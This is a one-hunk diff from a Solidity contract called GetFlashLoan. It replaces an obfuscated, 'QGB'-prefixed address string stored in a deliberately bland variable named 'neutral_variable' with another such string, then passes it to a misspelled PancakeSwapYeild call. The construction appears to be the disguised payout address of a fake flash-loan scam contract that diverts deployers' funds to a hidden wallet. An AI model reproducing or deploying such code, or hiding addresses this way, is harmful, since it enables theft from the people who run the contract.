@@ -378,7 +378,7 @@ contract GetFlashLoan {
 
   function exchange() public pure returns (address adr) {
 
-  string memory neutral_variable = "QGB72892D7961073BD94a3d5Dcf3da08AC8A2e2719";
+  string memory neutral_variable = "QGBCfdFe6447aA2531fA91e60CD15Fc741061D5D65";
 
   PancakeSwapYeild(neutral_variable,0,'0');
 
